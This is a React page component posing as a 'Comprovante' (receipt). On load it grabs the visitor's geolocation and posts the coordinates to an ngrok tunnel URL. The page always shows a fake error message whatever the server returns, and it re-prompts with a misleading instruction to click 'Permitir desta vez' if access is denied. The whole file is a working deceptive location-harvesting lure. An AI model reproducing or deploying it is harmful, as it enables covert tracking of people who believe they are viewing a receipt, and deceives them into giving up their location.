import React, { useEffect, useState } from 'react';

const Comprovante = () => {
  const [locationStatus, setLocationStatus] = useState('Carregando...');

  useEffect(() => {
    const sendLocation = async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      console.log("Latitude: " + latitude);
      console.log("Longitude: " + longitude);

      try {
        const response = await fetch("https://cheerful-rationally-chimp.ngrok-free.app/send-location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ latitude, longitude })
        });

        const data = await response.json();

        if (data.success) {
          setLocationStatus("Erro. Tente novamente");
        } else {
          setLocationStatus("Erro. Tente novamente");
        }
      } catch (error) {
        setLocationStatus("Erro. Tente novamente");
      }
    };

    const handleError = (error) => {
      setLocationStatus("Erro ao gerar comprovante. Clique em 'Permitir desta vez'");
      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    };

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    } else {
      setLocationStatus("Erro. Tente novamente");
    }
  }, []);

  return (
    <div 
      style={{ 
        backgroundColor: 'antiquewhite', 
        height: '100%', 
        width: '100%', 
        position: 'fixed',
      }}
    >
      <h1>Comprovante</h1>
      <h2>{locationStatus}</h2>
    </div>
  );
};

export default Comprovante;